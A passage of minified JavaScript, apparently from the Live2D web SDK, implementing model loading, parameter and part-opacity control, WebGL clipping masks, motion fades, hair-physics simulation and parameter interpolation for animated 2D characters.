tt(){At||(this.visible=!0,this._$g0=!1,this._$NL=null,this._$3S=null,this._$aS=null,tt._$42++)}function it(t){this._$VS=null,this._$e0=null,this._$e0=t}function et(t){At||(this.id=t)}function rt(){}function ot(){At||(this._$4S=null)}function nt(t,i){this.canvas=t,this.context=i,this.viewport=new Array(0,0,t.width,t.height),this._$6r=1,this._$xP=0,this._$3r=1,this._$uP=0,this._$Qo=-1,this.cacheImages={}}function st(){At||(this._$TT=null,this._$LT=null,this._$FS=null,this._$wL=null)}function _t(t){At||(this._$e0=null,this._$IP=null,this._$JS=!1,this._$AT=!0,this._$e0=t,this.totalScale=1,this._$7s=1,this.totalOpacity=1)}function at(){}function ht(){}function lt(t){At||(this._$ib=t)}function $t(){At||(W.prototype.constructor.call(this),this._$LP=-1,this._$d0=0,this._$Yo=0,this._$JP=null,this._$5P=null,this._$BP=null,this._$Eo=null,this._$Qi=null,this._$6s=$t._$ms,this.culling=!0,this.gl_cacheImage=null,this.instanceNo=$t._$42++)}function ut(t){Mt.prototype.constructor.call(this,t),this._$8r=W._$ur,this._$Cr=null,this._$hr=null}function pt(){At||(this.x=null,this.y=null)}function ft(t){At||(i.prototype.constructor.call(this),this.drawParamWebGL=new mt(t),this.drawParamWebGL.setGL(at.getGL(t)))}function ct(){At||(this.motions=null,this._$eb=!1,this.motions=new Array)}function dt(){this._$w0=null,this._$AT=!0,this._$9L=!1,this._$z2=-1,this._$bs=-1,this._$Do=-1,this._$sr=null,this._$sr=dt._$Gs++}function gt(){this.m=new Array(1,0,0,0,1,0,0,0,1)}function yt(t){At||et.prototype.constructor.call(this,t)}function mt(t){At||(E.prototype.constructor.call(this),this.textures=new Array,this.transform=null,this.gl=null,this.glno=t,this.firstDraw=!0,this.anisotropyExt=null,this.maxAnisotropy=0,this._$As=32,this._$Gr=!1,this._$NT=null,this._$vS=null,this._$no=null,this.vertShader=null,this.fragShader=null,this.vertShaderOff=null,this.fragShaderOff=null)}function Tt(t,i,e){return null==i&&(i=t.createBuffer()),t.bindBuffer(t.ARRAY_BUFFER,i),t.bufferData(t.ARRAY_BUFFER,e,t.DYNAMIC_DRAW),i}function Pt(t,i,e){return null==i&&(i=t.createBuffer()),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,i),t.bufferData(t.ELEMENT_ARRAY_BUFFER,e,t.DYNAMIC_DRAW),i}function St(t){At||(this._$P=new Int8Array(8),this._$R0=new DataView(this._$P.buffer),this._$3i=new Int8Array(1e3),this._$hL=0,this._$v0=0,this._$S2=0,this._$Ko=new Array,this._$T=t,this._$F=0)}function vt(){}function Lt(){}function Mt(t){At||(this._$e0=null,this._$IP=null,this._$Us=null,this._$7s=null,this._$IS=[!1],this._$VS=null,this._$AT=!0,this.baseOpacity=1,this.clipBufPre_clipContext=null,this._$e0=t)}function Et(){}var At=!0;i._$0s=1,i._$4s=2,i._$42=0,i._$62=function(t,e){try{if(e instanceof ArrayBuffer&&(e=new DataView(e)),!(e instanceof DataView))throw new lt(\"_$SS#loadModel(b) / b _$x be DataView or ArrayBuffer\");var r,o=new St(e),n=o._$ST(),s=o._$ST(),a=o._$ST();if(109!=n||111!=s||99!=a)throw new lt(\"_$gi _$C _$li , _$Q0 _$P0.\");if(r=o._$ST(),o._$gr(r),r>G._$T7){t._$NP|=i._$4s;throw new lt(\"_$gi _$C _$li , _$n0 _$_ version _$li ( SDK : \"+G._$T7+\" < _$f0 : \"+r+\" )@_$SS#loadModel()\\n\")}var h=o._$nP();if(r>=G._$s7){var l=o._$9T(),$=o._$9T();if(-30584!=l||-30584!=$)throw t._$NP|=i._$0s,new lt(\"_$gi _$C _$li , _$0 _$6 _$Ui.\")}t._$KS(h);var u=t.getModelContext();u.setDrawParam(t.getDrawParam()),u.init()}catch(t){_._$Rb(t)}},i.prototype._$KS=function(t){this._$MT=t},i.prototype.getModelImpl=function(){return null==this._$MT&&(this._$MT=new p,this._$MT._$zP()),this._$MT},i.prototype.getCanvasWidth=function(){return null==this._$MT?0:this._$MT.getCanvasWidth()},i.prototype.getCanvasHeight=function(){return null==this._$MT?0:this._$MT.getCanvasHeight()},i.prototype.getParamFloat=function(t){return\"number\"!=typeof t&&(t=this._$5S.getParamIndex(u.getID(t))),this._$5S.getParamFloat(t)},i.prototype.setParamFloat=function(t,i,e){\"number\"!=typeof t&&(t=this._$5S.getParamIndex(u.getID(t))),arguments.length<3&&(e=1),this._$5S.setParamFloat(t,this._$5S.getParamFloat(t)*(1-e)+i*e)},i.prototype.addToParamFloat=function(t,i,e){\"number\"!=typeof t&&(t=this._$5S.getParamIndex(u.getID(t))),arguments.length<3&&(e=1),this._$5S.setParamFloat(t,this._$5S.getParamFloat(t)+i*e)},i.prototype.multParamFloat=function(t,i,e){\"number\"!=typeof t&&(t=this._$5S.getParamIndex(u.getID(t))),arguments.length<3&&(e=1),this._$5S.setParamFloat(t,this._$5S.getParamFloat(t)*(1+(i-1)*e))},i.prototype.getParamIndex=function(t){return this._$5S.getParamIndex(u.getID(t))},i.prototype.loadParam=function(){this._$5S.loadParam()},i.prototype.saveParam=function(){this._$5S.saveParam()},i.prototype.init=function(){this._$5S.init()},i.prototype.update=function(){this._$5S.update()},i.prototype._$Rs=function(){return _._$li(\"_$60 _$PT _$Rs()\"),-1},i.prototype._$Ds=function(t){_._$li(\"_$60 _$PT _$SS#_$Ds() \\n\")},i.prototype._$K2=function(){},i.prototype.draw=function(){},i.prototype.getModelContext=function(){return this._$5S},i.prototype._$s2=function(){return this._$NP},i.prototype._$P7=function(t,i,e,r){var o=-1,n=0,s=this;if(0!=e)if(1==t.length){var _=t[0],a=0!=s.getParamFloat(_),h=i[0],l=s.getPartsOpacity(h),$=e/r;a?(l+=$)>1&&(l=1):(l-=$)<0&&(l=0),s.setPartsOpacity(h,l)}else{for(var u=0;u<t.length;u++){var _=t[u],p=0!=s.getParamFloat(_);if(p){if(o>=0)break;o=u;var h=i[u];n=s.getPartsOpacity(h),n+=e/r,n>1&&(n=1)}}o<0&&(console.log(\"No _$wi _$q0/ _$U default[%s]\",t[0]),o=0,n=1,s.loadParam(),s.setParamFloat(t[o],n),s.saveParam());for(var u=0;u<t.length;u++){var h=i[u];if(o==u)s.setPartsOpacity(h,n);else{var f,c=s.getPartsOpacity(h);f=n<.5?-.5*n/.5+1:.5*(1-n)/.5;var d=(1-f)*(1-n);d>.15&&(f=1-.15/(1-n)),c>f&&(c=f),s.setPartsOpacity(h,c)}}}else for(var u=0;u<t.length;u++){var _=t[u],h=i[u],p=0!=s.getParamFloat(_);s.setPartsOpacity(h,p?1:0)}},i.prototype.setPartsOpacity=function(t,i){\"number\"!=typeof t&&(t=this._$5S.getPartsDataIndex(l.getID(t))),this._$5S.setPartsOpacity(t,i)},i.prototype.getPartsDataIndex=function(t){return t instanceof l||(t=l.getID(t)),this._$5S.getPartsDataIndex(t)},i.prototype.getPartsOpacity=function(t){return\"number\"!=typeof t&&(t=this._$5S.getPartsDataIndex(l.getID(t))),t<0?0:this._$5S.getPartsOpacity(t)},i.prototype.getDrawParam=function(){},i.prototype.getDrawDataIndex=function(t){return this._$5S.getDrawDataIndex(b.getID(t))},i.prototype.getDrawData=function(t){return this._$5S.getDrawData(t)},i.prototype.getTransformedPoints=function(t){var i=this._$5S._$C2(t);return i instanceof ut?i.getTransformedPoints():null},i.prototype.getIndexArray=function(t){if(t<0||t>=this._$5S._$aS.length)return null;var i=this._$5S._$aS[t];return null!=i&&i.getType()==W._$wb&&i instanceof $t?i.getIndexArray():null},e.CHANNEL_COUNT=4,e.RENDER_TEXTURE_USE_MIPMAP=!1,e.NOT_USED_FRAME=-100,e.prototype._$L7=function(){if(this.tmpModelToViewMatrix&&(this.tmpModelToViewMatrix=null),this.tmpMatrix2&&(this.tmpMatrix2=null),this.tmpMatrixForMask&&(this.tmpMatrixForMask=null),this.tmpMatrixForDraw&&(this.tmpMatrixForDraw=null),this.tmpBoundsOnModel&&(this.tmpBoundsOnModel=null),this.CHANNEL_COLORS){for(var t=this.CHANNEL_COLORS.length-1;t>=0;--t)this.CHANNEL_COLORS.splice(t,1);this.CHANNEL_COLORS=[]}this.releaseShader()},e.prototype.releaseShader=function(){for(var t=at.frameBuffers.length,i=0;i<t;i++)this.gl.deleteFramebuffer(at.frameBuffers[i].framebuffer);at.frameBuffers=[],at.glContext=[]},e.prototype.init=function(t,i,e){for(var o=0;o<i.length;o++){var n=i[o].getClipIDList();if(null!=n){var s=this.findSameClip(n);null==s&&(s=new r(this,t,n),this.clipContextList.push(s));var _=i[o].getDrawDataID(),a=t.getDrawDataIndex(_);s.addClippedDrawData(_,a);e[o].clipBufPre_clipContext=s}}},e.prototype.getMaskRenderTexture=function(){var t=null;return t=this.dp_webgl.createFramebuffer(),at.frameBuffers[this.dp_webgl.glno]=t,this.dp_webgl.glno},e.prototype.setupClip=function(t,i){for(var e=0,r=0;r<this.clipContextList.length;r++){var o=this.clipContextList[r];this.calcClippedDrawTotalBounds(t,o),o.isUsing&&e++}if(e>0){var n=i.gl.getParameter(i.gl.FRAMEBUFFER_BINDING),s=new Array(4);s[0]=0,s[1]=0,s[2]=i.gl.canvas.width,s[3]=i.gl.canvas.height,i.gl.viewport(0,0,at.clippingMaskBufferSize,at.clippingMaskBufferSize),this.setupLayoutBounds(e),i.gl.bindFramebuffer(i.gl.FRAMEBUFFER,at.frameBuffers[this.curFrameNo].framebuffer),i.gl.clearColor(0,0,0,0),i.gl.clear(i.gl.COLOR_BUFFER_BIT);for(var r=0;r<this.clipContextList.length;r++){var o=this.clipContextList[r],_=o.allClippedDrawRect,a=(o.layoutChannelNo,o.layoutBounds);this.tmpBoundsOnModel._$jL(_),this.tmpBoundsOnModel.expand(.05*_.width,.05*_.height);var h=a.width/this.tmpBoundsOnModel.width,l=a.height/this.tmpBoundsOnModel.height;this.tmpMatrix2.identity(),this.tmpMatrix2.translate(-1,-1,0),this.tmpMatrix2.scale(2,2,1),this.tmpMatrix2.translate(a.x,a.y,0),this.tmpMatrix2.scale(h,l,1),this.tmpMatrix2.translate(-this.tmpBoundsOnModel.x,-this.tmpBoundsOnModel.y,0),this.tmpMatrixForMask.setMatrix(this.tmpMatrix2.m),this.tmpMatrix2.identity(),this.tmpMatrix2.translate(a.x,a.y,0),this.tmpMatrix2.scale(h,l,1),this.tmpMatrix2.translate(-this.tmpBoundsOnModel.x,-this.tmpBoundsOnModel.y,0),this.tmpMatrixForDraw.setMatrix(this.tmpMatrix2.m);for(var $=this.tmpMatrixForMask.getArray(),u=0;u<16;u++)o.matrixForMask[u]=$[u];for(var p=this.tmpMatrixForDraw.getArray(),u=0;u<16;u++)o.matrixForDraw[u]=p[u];for(var f=o.clippingMaskDrawIndexList.length,c=0;c<f;c++){var d=o.clippingMaskDrawIndexList[c],g=t.getDrawData(d),y=t._$C2(d);i.setClipBufPre_clipContextForMask(o),g.draw(i,t,y)}}i.gl.bindFramebuffer(i.gl.FRAMEBUFFER,n),i.setClipBufPre_clipContextForMask(null),i.gl.viewport(s[0],s[1],s[2],s[3])}},e.prototype.getColorBuffer=function(){return this.colorBuffer},e.prototype.findSameClip=function(t){for(var i=0;i<this.clipContextList.length;i++){var e=this.clipContextList[i],r=e.clipIDList.length;if(r==t.length){for(var o=0,n=0;n<r;n++)for(var s=e.clipIDList[n],_=0;_<r;_++)if(t[_]==s){o++;break}if(o==r)return e}}return null},e.prototype.calcClippedDrawTotalBounds=function(t,i){for(var e=t._$Ri.getModelImpl().getCanvasWidth(),r=t._$Ri.getModelImpl().getCanvasHeight(),o=e>r?e:r,n=o,s=o,_=0,a=0,h=i.clippedDrawContextList.length,l=0;l<h;l++){var $=i.clippedDrawContextList[l],u=$.drawDataIndex,p=t._$C2(u);if(p._$yo()){for(var f=p.getTransformedPoints(),c=f.length,d=[],g=[],y=0,m=U._$i2;m<c;m+=U._$No)d[y]=f[m],g[y]=f[m+1],y++;var T=Math.min.apply(null,d),P=Math.min.apply(null,g),S=Math.max.apply(null,d),v=Math.max.apply(null,g);T<n&&(n=T),P<s&&(s=P),S>_&&(_=S),v>a&&(a=v)}}if(n==o)i.allClippedDrawRect.x=0,i.allClippedDrawRect.y=0,i.allClippedDrawRect.width=0,i.allClippedDrawRect.height=0,i.isUsing=!1;else{var L=_-n,M=a-s;i.allClippedDrawRect.x=n,i.allClippedDrawRect.y=s,i.allClippedDrawRect.width=L,i.allClippedDrawRect.height=M,i.isUsing=!0}},e.prototype.setupLayoutBounds=function(t){var i=t/e.CHANNEL_COUNT,r=t%e.CHANNEL_COUNT;i=~~i,r=~~r;for(var o=0,n=0;n<e.CHANNEL_COUNT;n++){var s=i+(n<r?1:0);if(0==s);else if(1==s){var a=this.clipContextList[o++];a.layoutChannelNo=n,a.layoutBounds.x=0,a.layoutBounds.y=0,a.layoutBounds.width=1,a.layoutBounds.height=1}else if(2==s)for(var h=0;h<s;h++){var l=h%2,$=0;l=~~l;var a=this.clipContextList[o++];a.layoutChannelNo=n,a.layoutBounds.x=.5*l,a.layoutBounds.y=0,a.layoutBounds.width=.5,a.layoutBounds.height=1}else if(s<=4)for(var h=0;h<s;h++){var l=h%2,$=h/2;l=~~l,$=~~$;var a=this.clipContextList[o++];a.layoutChannelNo=n,a.layoutBounds.x=.5*l,a.layoutBounds.y=.5*$,a.layoutBounds.width=.5,a.layoutBounds.height=.5}else if(s<=9)for(var h=0;h<s;h++){var l=h%3,$=h/3;l=~~l,$=~~$;var a=this.clipContextList[o++];a.layoutChannelNo=n,a.layoutBounds.x=l/3,a.layoutBounds.y=$/3,a.layoutBounds.width=1/3,a.layoutBounds.height=1/3}else _._$li(\"_$6 _$0P mask count : %d\",s)}},r.prototype.addClippedDrawData=function(t,i){var e=new o(t,i);this.clippedDrawContextList.push(e)},s._$JT=function(t,i,e){var r=t/i,o=e/i,n=o,s=1-(1-o)*(1-o),_=1-(1-n)*(1-n),a=1/3*(1-o)*s+(n*(2/3)+1/3*(1-n))*(1-s),h=(n+2/3*(1-n))*_+(o*(1/3)+2/3*(1-o))*(1-_),l=1-3*h+3*a-0,$=3*h-6*a+0,u=3*a-0;if(r<=0)return 0;if(r>=1)return 1;var p=r,f=p*p;return l*(p*f)+$*f+u*p+0},s.prototype._$a0=function(){},s.prototype.setFadeIn=function(t){this._$dP=t},s.prototype.setFadeOut=function(t){this._$eo=t},s.prototype._$pT=function(t){this._$V0=t},s.prototype.getFadeOut=function(){return this._$eo},s.prototype._$4T=function(){return this._$eo},s.prototype._$mT=function(){return this._$V0},s.prototype.getDurationMSec=function(){return-1},s.prototype.getLoopDurationMSec=function(){return-1},s.prototype.updateParam=function(t,i){if(i._$AT&&!i._$9L){var e=w.getUserTimeMSec();if(i._$z2<0){i._$z2=e,i._$bs=e;var r=this.getDurationMSec();i._$Do<0&&(i._$Do=r<=0?-1:i._$z2+r)}var o=this._$V0;o=o*(0==this._$dP?1:ht._$r2((e-i._$bs)/this._$dP))*(0==this._$eo||i._$Do<0?1:ht._$r2((i._$Do-e)/this._$eo)),0<=o&&o<=1||console.log(\"### assert!! ### \"),this.updateParamExe(t,e,o,i),i._$Do>0&&i._$Do<e&&(i._$9L=!0)}},s.prototype.updateParamExe=function(t,i,e,r){},_._$8s=0,_._$fT=new Object,_.start=function(t){var i=_._$fT[t];null==i&&(i=new a,i._$r=t,_._$fT[t]=i),i._$0S=w.getSystemTimeMSec()},_.dump=function(t){var i=_._$fT[t];if(null!=i){var e=w.getSystemTimeMSec(),r=e-i._$0S;return console.log(t+\" : \"+r+\"ms\"),r}return-1},_.end=function(t){var i=_._$fT[t];if(null!=i){return w.getSystemTimeMSec()-i._$0S}return-1},_._$li=function(t,i){console.log(\"_$li : \"+t+\"\\n\",i)},_._$Ji=function(t,i){console.log(t,i)},_._$dL=function(t,i){console.log(t,i),console.log(\"\\n\")},_._$KL=function(t,i){for(var e=0;e<i;e++)e%16==0&&e>0?console.log(\"\\n\"):e%8==0&&e>0&&console.log(\"  \"),console.log(\"%02X \",255&t[e]);console.log(\"\\n\")},_._$nr=function(t,i,e){console.log(\"%s\\n\",t);for(var r=i.length,o=0;o<r;++o)console.log(\"%5d\",i[o]),console.log(\"%s\\n\",e),console.log(\",\");console.log(\"\\n\")},_._$Rb=function(t){console.log(\"dump exception : \"+t),console.log(\"stack :: \"+t.stack)},h.prototype._$8P=function(){return.5*(this.x+this.x+this.width)},h.prototype._$6P=function(){return.5*(this.y+this.y+this.height)},h.prototype._$EL=function(){return this.x+this.width},h.prototype._$5T=function(){return this.y+this.height},h.prototype._$jL=function(t,i,e,r){this.x=t,this.y=i,this.width=e,this.height=r},h.prototype._$jL=function(t){this.x=t.x,this.y=t.y,this.width=t.width,this.height=t.height},l.prototype=new et,l._$tP=new Object,l._$27=function(){l._$tP.clear()},l.getID=function(t){var i=l._$tP[t];return null==i&&(i=new l(t),l._$tP[t]=i),i},l.prototype._$3s=function(){return new l},u.prototype=new et,u._$tP=new Object,u._$27=function(){u._$tP.clear()},u.getID=function(t){var i=u._$tP[t];return null==i&&(i=new u(t),u._$tP[t]=i),i},u.prototype._$3s=function(){return new u},p._$42=0,p.prototype._$zP=function(){null==this._$vo&&(this._$vo=new ot),null==this._$F2&&(this._$F2=new Array)},p.prototype.getCanvasWidth=function(){return this._$ao},p.prototype.getCanvasHeight=function(){return this._$1S},p.prototype._$F0=function(t){this._$vo=t._$nP(),this._$F2=t._$nP(),this._$ao=t._$6L(),this._$1S=t._$6L()},p.prototype._$6S=function(t){this._$F2.push(t)},p.prototype._$Xr=function(){return this._$F2},p.prototype._$E2=function(){return this._$vo},f.prototype.setup=function(t,i,e){this._$ks=this._$Yb(),this.p2._$xT(),3==arguments.length&&(this._$Fo=t,this._$L2=i,this.p1._$p=e,this.p2._$p=e,this.p2.y=t,this.setup())},f.prototype.getPhysicsPoint1=function(){return this.p1},f.prototype.getPhysicsPoint2=function(){return this.p2},f.prototype._$qr=function(){return this._$Db},f.prototype._$pr=function(t){this._$Db=t},f.prototype._$5r=function(){return this._$M2},f.prototype._$Cs=function(){return this._$9b},f.prototype._$Yb=function(){return-180*Math.atan2(this.p1.x-this.p2.x,-(this.p1.y-this.p2.y))/Math.PI},f.prototype.addSrcParam=function(t,i,e,r){var o=new g(t,i,e,r);this._$lL.push(o)},f.prototype.addTargetParam=function(t,i,e,r){var o=new T(t,i,e,r);this._$qP.push(o)},f.prototype.update=function(t,i){if(0==this._$iP)return this._$iP=this._$iT=i,void(this._$Fo=Math.sqrt((this.p1.x-this.p2.x)*(this.p1.x-this.p2.x)+(this.p1.y-this.p2.y)*(this.p1.y-this.p2.y)));var e=(i-this._$iT)/1e3;if(0!=e){for(var r=this._$lL.length-1;r>=0;--r){this._$lL[r]._$oP(t,this)}this._$oo(t,e),this._$M2=this._$Yb(),this._$9b=(this._$M2-this._$ks)/e,this._$ks=this._$M2}for(var r=this._$qP.length-1;r>=0;--r){this._$qP[r]._$YS(t,this)}this._$iT=i},f.prototype._$oo=function(t,i){i<.033&&(i=.033);var e=1/i;this.p1.vx=(this.p1.x-this.p1._$s0)*e,this.p1.vy=(this.p1.y-this.p1._$70)*e,this.p1.ax=(this.p1.vx-this.p1._$7L)*e,this.p1.ay=(this.p1.vy-this.p1._$HL)*e,this.p1.fx=this.p1.ax*this.p1._$p,this.p1.fy=this.p1.ay*this.p1._$p,this.p1._$xT();var r,o,n=-Math.atan2(this.p1.y-this.p2.y,this.p1.x-this.p2.x),s=Math.cos(n),_=Math.sin(n),a=9.8*this.p2._$p,h=this._$Db*Lt._$bS,l=a*Math.cos(n-h);r=l*_,o=l*s;var $=-this.p1.fx*_*_,u=-this.p1.fy*_*s,p=-this.p2.vx*this._$L2,f=-this.p2.vy*this._$L2;this.p2.fx=r+$+p,this.p2.fy=o+u+f,this.p2.ax=this.p2.fx/this.p2._$p,this.p2.ay=this.p2.fy/this.p2._$p,this.p2.vx+=this.p2.ax*i,this.p2.vy+=this.p2.ay*i,this.p2.x+=this.p2.vx*i,this.p2.y+=this.p2.vy*i;var c=Math.sqrt((this.p1.x-this.p2.x)*(this.p1.x-this.p2.x)+(this.p1.y-this.p2.y)*(this.p1.y-this.p2.y));this.p2.x=this.p1.x+this._$Fo*(this.p2.x-this.p1.x)/c,this.p2.y=this.p1.y+this._$Fo*(this.p2.y-this.p1.y)/c,this.p2.vx=(this.p2.x-this.p2._$s0)*e,this.p2.vy=(this.p2.y-this.p2._$70)*e,this.p2._$xT()},c.prototype._$xT=function(){this._$s0=this.x,this._$70=this.y,this._$7L=this.vx,this._$HL=this.vy},d.prototype._$oP=function(t,i){},g.prototype=new d,g.prototype._$oP=function(t,i){var e=this.scale*t.getParamFloat(this._$wL),r=i.getPhysicsPoint1();switch(this._$tL){default:case f.Src.SRC_TO_X:r.x=r.x+(e-r.x)*this._$V0;break;case f.Src.SRC_TO_Y:r.y=r.y+(e-r.y)*this._$V0;break;case f.Src.SRC_TO_G_ANGLE:var o=i._$qr();o+=(e-o)*this._$V0,i._$pr(o)}},y.prototype._$YS=function(t,i){},T.prototype=new y,T.prototype._$YS=function(t,i){switch(this._$YP){default:case f.Target.TARGET_FROM_ANGLE:t.setParamFloat(this._$wL,this.scale*i._$5r(),this._$V0);break;case f.Target.TARGET_FROM_ANGLE_V:t.setParamFloat(this._$wL,this.scale*i._$Cs(),this._$V0)}},f.Src=function(){},f.Src.SRC_TO_X=\"SRC_TO_X\",f.Src.SRC_TO_Y=\"SRC_TO_Y\",f.Src.SRC_TO_G_ANGLE=\"SRC_TO_G_ANGLE\",f.Target=function(){},f.Target.TARGET_FROM_ANGLE=\"TARGET_FROM_ANGLE\",f.Target.TARGET_FROM_ANGLE_V=\"TARGET_FROM_ANGLE_V\",P.prototype.init=function(t){this._$fL=t._$fL,this._$gL=t._$gL,this._$B0=t._$B0,this._$z0=t._$z0,this._$qT=t._$qT,this.reflectX=t.reflectX,this.reflectY=t.reflectY},P.prototype._$F0=function(t){this._$fL=t._$_T(),this._$gL=t._$_T(),this._$B0=t._$_T(),this._$z0=t._$_T(),this._$qT=t._$_T(),t.getFormatVersion()>=G.LIVE2D_FORMAT_VERSION_V2_10_SDK2&&(this.reflectX=t._$po(),this.reflectY=t._$po())},P.prototype._$e=function(){};var It=function(){};It._$ni=function(t,i,e,r,o,n,s,_,a){var h=s*n-_*o;if(0==h)return null;var l,$=((t-e)*n-(i-r)*o)/h;return l=0!=o?(t-e-$*s)/o:(i-r-$*_)/n,isNaN(l)&&(l=(t-e-$*s)/o,isNaN(l)&&(l=(i-r-$*_)/n),isNaN(l)&&(console.log(\"a is NaN @UtVector#_$ni() \"),console.log(\"v1x : \"+o),console.log(\"v1x != 0 ? \"+(0!=o)))),null==a?new Array(l,$):(a[0]=l,a[1]=$,a)},S.prototype._$8P=function(){return this.x+.5*this.width},S.prototype._$6P=function(){return this.y+.5*this.height},S.prototype._$EL=function(){return this.x+this.width},S.prototype._$5T=function(){return this.y+this.height},S.prototype._$jL=function(t,i,e,r){this.x=t,this.y=i,this.width=e,this.height=r},S.prototype._$jL=function(t){this.x=t.x,this.y=t.y,this.width=t.width,this.height=t.height},S.prototype.contains=function(t,i){return this.x<=this.x&&this.y<=this.y&&this.x<=this.x+this.width&&this.y<=this.y+this.height},S.prototype.expand=function(t,i){this.x-=t,this.y-=i,this.width+=2*t,this.height+=2*i},v._$Z2=function(t,i,e,r){var o=i._$Q2(t,e),n=t._$vs(),s=t._$Tr();if(i._$zr(n,s,o),o<=0)return r[n[0]];if(1==o){var _=r[n[0]],a=r[n[1]],h=s[0];return _+(a-_)*h|0}if(2==o){var _=r[n[0]],a=r[n[1]],l=r[n[2]],$=r[n[3]],h=s[0],u=s[1],p=_+(a-_)*h|0,f=l+($-l)*h|0;return p+(f-p)*u|0}if(3==o){var c=r[n[0]],d=r[n[1]],g=r[n[2]],y=r[n[3]],m=r[n[4]],T=r[n[5]],P=r[n[6]],S=r[n[7]],h=s[0],u=s[1],v=s[2],_=c+(d-c)*h|0,a=g+(y-g)*h|0,l=m+(T-m)*h|0,$=P+(S-P)*h|0,p=_+(a-_)*u|0,f=l+($-l)*u|0;return p+(f-p)*v|0}if(4==o){var L=r[n[0]],M=r[n[1]],E=r[n[2]],A=r[n[3]],I=r[n[4]],w=r[n[5]],x=r[n[6]],O=r[n[7]],D=r[n[8]],R=r[n[9]],b=r[n[10]],F=r[n[11]],C=r[n[12]],N=r[n[13]],B=r[n[14]],U=r[n[15]],h=s[0],u=s[1],v=s[2],G=s[3],c=L+(M-L)*h|0,d=E+(A-E)*h|0,g=I+(w-I)*h|0,y=x+(O-x)*h|0,m=D+(R-D)*h|0,T=b+(F-b)*h|0,P=C+(N-C)*h|0,S=B+(U-B)*h|0,_=c+(d-c)*u|0,a=g+(y-g)*u|0,l=m+(T-m)*u|0,$=P+(S-P)*u|0,p=_+(a-_)*v|0,f=l+($-l)*v|0;return p+(f-p)*G|0}for(var Y=1<<o,k=new Float32Array(Y),V=0;V<Y;V++){for(var X=V,z=1,H=0;H<o;H++)z*=X%2==0?1-s[H]:s[H],X/=2;k[V]=z}for(var W=new Float32Array(Y),j=0;j<Y;j++)W[j]=r[n[j]];for(var q=0,j=0;j<Y;j++)q+=k[j]*W[j];return q+.5|0},v._$br=function(t,i,e,r){var o=i._$Q2(t,e),n=t._$vs(),s=t._$Tr();if(i._$zr(n,s,o),o<=0)return r[n[0]];if(1==o){var _=r[n[0]],a=r[n[1]],h=s[0];return _+(a-_)*h}if(2==o){var _=r[n[0]],a=r[n[1]],l=r[n[2]],$=r[n[3]],h=s[0],u=s[1];return(1-u)*(_+(a-_)*h)+u*(l+($-l)*h)}if(3==o){var p=r[n[0]],f=r[n[1]],c=r[n[2]],d=r[n[3]],g=r[n[4]],y=r[n[5]],m=r[n[6]],T=r[n[7]],h=s[0],u=s[1],P=s[2];return(1-P)*((1-u)*(p+(f-p)*h)+u*(c+(d-c)*h))+P*((1-u)*(g+(y-g)*h)+u*(m+(T-m)*h))}if(4==o){var S=r[n[0]],v=r[n[1]],L=r[n[2]],M=r[n[3]],E=r[n[4]],A=r[n[5]],I=r[n[6]],w=r[n[7]],x=r[n[8]],O=r[n[9]],D=r[n[10]],R=r[n[11]],b=r[n[12]],F=r[n[13]],C=r[n[14]],N=r[n[15]],h=s[0],u=s[1],P=s[2],B=s[3];return(1-B)*((1-P)*((1-u)*(S+(v-S)*h)+u*(L+(M-L)*h))+P*((1-u)*(E+(A-E)*h)+u*(I+(w-I)*h)))+B*((1-P)*((1-u)*(x+(O-x)*h)+u*(D+(R-D)*h))+P*((1-u)*(b+(F-b)*h)+u*(C+(N-C)*h)))}for(var U=1<<o,G=new Float32Array(U),Y=0;Y<U;Y++){for(var k=Y,V=1,X=0;X<o;X++)V*=k%2==0?1-s[X]:s[X],k/=2;G[Y]=V}for(var z=new Float32Array(U),H=0;H<U;H++)z[H]=r[n[H]];for(var W=0,H=0;H<U;H++)W+=G[H]*z[H];return W},v._$Vr=function(t,i,e,r,o,n,s,_){var a=i._$Q2(t,e),h=t._$vs(),l=t._$Tr();i._$zr(h,l,a);var $=2*r,u=s;if(a<=0){var p=h[0],f=o[p];if(2==_&&0==s)w._$jT(f,0,n,0,$);else for(var c=0;c<$;)n[u]=f[c++],n[u+1]=f[c++],u+=_}else if(1==a)for(var f=o[h[0]],d=o[h[1]],g=l[0],y=1-g,c=0;c<$;)n[u]=f[c]*y+d[c]*g,++c,n[u+1]=f[c]*y+d[c]*g,++c,u+=_;else if(2==a)for(var f=o[h[0]],d=o[h[1]],m=o[h[2]],T=o[h[3]],g=l[0],P=l[1],y=1-g,S=1-P,v=S*y,L=S*g,M=P*y,E=P*g,c=0;c<$;)n[u]=v*f[c]+L*d[c]+M*m[c]+E*T[c],++c,n[u+1]=v*f[c]+L*d[c]+M*m[c]+E*T[c],++c,u+=_;else if(3==a)for(var A=o[h[0]],I=o[h[1]],x=o[h[2]],O=o[h[3]],D=o[h[4]],R=o[h[5]],b=o[h[6]],F=o[h[7]],g=l[0],P=l[1],C=l[2],y=1-g,S=1-P,N=1-C,B=N*S*y,U=N*S*g,G=N*P*y,Y=N*P*g,k=C*S*y,V=C*S*g,X=C*P*y,z=C*P*g,c=0;c<$;)n[u]=B*A[c]+U*I[c]+G*x[c]+Y*O[c]+k*D[c]+V*R[c]+X*b[c]+z*F[c],++c,n[u+1]=B*A[c]+U*I[c]+G*x[c]+Y*O[c]+k*D[c]+V*R[c]+X*b[c]+z*F[c],++c,u+=_;else if(4==a)for(var 